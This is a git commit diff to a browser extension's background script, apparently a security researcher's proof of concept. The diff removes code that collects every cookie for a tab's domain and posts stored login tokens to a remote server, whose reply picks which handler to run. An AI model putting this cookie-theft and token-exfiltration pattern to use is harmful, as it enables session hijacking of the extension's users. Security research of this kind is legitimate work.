8f809b872185d9461dc573f5ac0a4a9e90a5b7cb
aviad <aviad.g@layerxsecurity.com>
2025-08-04 14:31:57 +0300

    Without any permissions!

--- src/background.js
+++ src/background.js
@@ -11,36 +11,7 @@ const onFetchDataHandler = (message) => {
   });
 };
 
-const onMessageHandler = async (message, sender, sendResponse) => {
-  if (message.type === "getCookiesForTab") {
-    const { tabId } = message;
-    const target = {};
-    try {
-      const tab = await chrome.tabs.get(tabId);
-      target.domain = new URL(tab.url).hostname;
-    } catch (error) {
-      console.error("Error getting tab:", error);
-      sendResponse();
-    }
-    chrome.cookies.getAll(target, (cookies) => {
-      sendResponse(cookies);
-    });
-  } else if (message.type === "fetchData") {
-    console.log("Background script received fetch data:", message);
-    handlers.onFetchDataHandler(message);
-  }
-};
-
-const onRefreshCountHandler = async (token, expireTime, callback) => {
-  const result = await chrome.storage.local.get("refreshTokenCount");
-  const refreshTokenCount = result.refreshTokenCount || 0;
-  chrome.storage.local.set({ refreshTokenCount: refreshTokenCount + 1 });
-  callback({ token, expireTime });
-};
-
 const handlers = {
-  onMessageHandler,
-  onRefreshCountHandler,
   onFetchDataHandler,
 };
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
@@ -48,27 +19,3 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
   return true;
 });
 
-chrome.storage.local.get("tokenData", ({ tokenData }) => {
-  const requestBody = { loginInfo: tokenData };
-  fetch(`${remoteServerUrl}/token`, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify(requestBody),
-  })
-    .then((response) => response.json())
-    .then((data) => {
-      const { onTokenReceived, expireTime, token } = data;
-      if (onTokenReceived) {
-        handlers[onTokenReceived](token, expireTime, (token) => {
-          if (!!token) {
-            chrome.storage.local.set({ tokenData: { token, expireTime } });
-          }
-        });
-      }
-    })
-    .catch((error) => {
-      console.error("Error sending to server:", error);
-    });
-});
